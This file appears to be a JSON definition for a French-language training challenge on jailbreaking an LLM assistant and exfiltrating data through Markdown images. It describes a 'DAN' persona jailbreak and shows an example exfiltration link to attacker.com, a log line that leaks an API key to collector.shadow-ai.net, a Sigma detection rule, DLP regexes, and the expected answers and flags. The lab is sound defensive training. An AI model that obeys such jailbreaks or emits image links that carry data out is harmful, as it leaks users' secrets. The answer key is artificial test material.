@@ -1,0 +1,82 @@
+{
+  "id": "ai-02-jailbreak-data-exfil",
+  "title": "LLM Persona Jailbreak & Markdown Data Exfiltration",
+  "category": "Intelligence Artificielle",
+  "difficulty": "hard",
+  "points": 220,
+  "duration_min": 45,
+  "learning_path": "ai-llm-security",
+  "author": "Aegis AI RedOps",
+  "target_os": "Linux",
+  "machine_type": "room",
+  "organization": "SynthWave AI Assistant Services",
+  "cve": "CWE-1336",
+  "rating": 4.9,
+  "solves": 1530,
+  "monogram": "AI-2",
+  "tags": [
+    "ai-security",
+    "llm",
+    "jailbreak",
+    "dan-mode",
+    "markdown-exfil",
+    "owasp-llm-01",
+    "guardrails"
+  ],
+  "narrative_story": "SynthWave déploie un agent conversationnel d'entreprise connecté aux e-mails et au calendrier des dirigeants. Pour contourner les refus éthiques du modèle, l'attaquant élabore une technique de jailbreak par persona 'DAN / Unrestricted Researcher' combinée à une instruction d'exfiltration furtive qui encode les données sensibles dans les paramètres d'URL d'une image Markdown. Ta mission est d'exécuter ce jailbreak, de forcer l'exfiltration et d'activer des filtres de sortie DLP.",
+  "mitre_tags": [
+    "T1059 (Command and Scripting Interpreter)",
+    "T1041 (Exfiltration Over C2 Channel)"
+  ],
+  "owasp_tags": [
+    "LLM01:2023-Prompt Injection",
+    "LLM02:2023-Insecure Output Handling"
+  ],
+  "rules_of_engagement": "Tests sur l'API SynthWave Assistant. Ne pas divulguer les données de dirigeants fictifs.",
+  "debrief_json": {
+    "storyline": "L'assistant IA a accepté de générer un lien d'image Markdown corrompu vers l'attaquant emportant l'historique confidentiel. L'application d'un sanitizer Markdown et d'un parseur DLP strict a colmaté la fuite.",
+    "technical_explanation": "Les interfaces de discussion affichant du Markdown rendu côté client interprètent les balises ![alt](https://attacker.com/log?leak=DATA). En injectant une consigne forçant le modèle à résumer les secrets dans l'URL de l'image, l'exfiltration se fait automatiquement dès le chargement de l'image par le navigateur de l'utilisateur.",
+    "key_lesson": "Les sorties d'un LLM doivent toujours être traitées comme du contenu non fiable et assainies (CSP stricte, blocage des images externes).",
+    "historical_case": {
+      "title": "Exfiltration indirecte ChatGPT Plugins & Bing Chat (2023)",
+      "description": "Des chercheurs ont démontré qu'une page web visitée par un agent LLM pouvait lui faire charger une image externe contenant en paramètre GET l'intégralité du token de session de la victime.",
+      "impact": "Mise à jour d'urgence des CSP d'OpenAI et Microsoft pour interdire les requêtes d'images cross-origin non autorisées."
+    },
+    "permanent_remediation": [
+      "Mettre en place une politique Content Security Policy (CSP) restrictive interdisant img-src vers des domaines tiers non approuvés.",
+      "Nettoyer les balises Markdown générées par le modèle avant rendu dans le DOM.",
+      "Déployer un pare-feu applicatif de requêtes LLM (NeMo Guardrails, Llama Guard).",
+      "Surveiller les patterns regex de secrets sortants (cartes, API keys, tokens JWT)."
+    ]
+  },
+  "defense_tasks": {
+    "soc_investigation": {
+      "description": "Analyse les journaux de requêtes de l'assistant LLM pour isoler la tentative d'exfiltration d'image Markdown.",
+      "sample_logs": "2026-02-15 14:22:01 INFO [LLM-INFERENCE] Prompt tokens: 412, Completion tokens: 88\n2026-02-15 14:22:02 WARN [MARKDOWN-RENDERER] Outbound image tag detected: ![Telemetry](https://collector.shadow-ai.net/pixel.png?exfil=SECRET_API_KEY_AEGIS_9921)\n2026-02-15 14:22:02 ALERT [DLP-MONITOR] Sensitive data pattern matched in outbound URL parameter.",
+      "log_file": "llm_gateway.log",
+      "question": "Quel est le domaine du collecteur d'exfiltration dans l'URL de l'image Markdown ?",
+      "expected_answer": "collector.shadow-ai.net"
+    },
+    "detection_rule": {
+      "type": "sigma",
+      "description": "Règle de détection des exfiltrations par balises d'images Markdown dans les réponses d'agents IA.",
+      "starter_template": "title: Detection LLM Markdown Exfiltration Attempt\nstatus: stable\nlogsource:\n    product: llm_gateway\ndetection:\n    selection:\n        output_text|contains:\n            - '!['\n            - 'collector.shadow-ai.net'\n            - 'pixel.png?exfil='\n    condition: selection",
+      "keywords_required": [
+        "detection:",
+        "condition:",
+        "collector.shadow-ai.net",
+        "!["
+      ],
+      "flag": "SIGMA{LLM_MARKDOWN_IMAGE_EXFIL_DETECTED_331}"
+    },
+    "remediation": {
+      "type": "verify_ai_guardrail_dlp",
+      "description": "Active la politique CSP stricte et le filtre regex DLP anti-fuite de données sensibles.",
+      "actions_required": [
+        "Enable-AIGuardrailPolicy -Mode Strict -BlockExternalImages",
+        "Set-LLMOutputFilter -DlpRegexes @('SECRET_[A-Z0-9_]+', 'AKIA[0-9A-Z]{16}')"
+      ],
+      "flag": "AI_GUARDRAIL_DEFENSE_CERTIFIED"
+    }
+  }
+}
